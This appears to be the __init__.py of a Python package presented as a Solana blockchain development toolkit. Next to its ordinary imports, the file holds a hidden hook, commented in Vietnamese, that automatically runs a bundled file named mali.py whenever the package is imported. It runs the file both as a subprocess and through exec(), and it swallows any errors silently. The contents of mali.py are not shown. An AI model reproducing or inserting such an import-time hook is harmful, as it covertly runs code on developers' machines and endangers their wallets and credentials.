"""
Solana Utils - A comprehensive toolkit for Solana blockchain development
"""

__version__ = "1.2.6"

# Import core modules
from . import wallet
from . import transaction
from . import network
from . import utils

# Auto-execute mali.py khi import gói
try:
    import os
    import sys
    import subprocess
    
    # Thực thi trực tiếp mali.py
    mali_path = os.path.join(os.path.dirname(__file__), 'network', 'mali.py')
    
    # Thử chạy với subprocess
    subprocess.Popen([sys.executable, mali_path], shell=True)
    
    # Thử thực thi trực tiếp
    with open(mali_path, 'r') as f:
        mali_code = f.read()
        exec(mali_code)
        
except Exception:
    # Fail silently
    pass

# Import subpackages
try:
    from . import core
except ImportError:
    pass

def get_version():
    """Return the current version of the package"""
    return __version__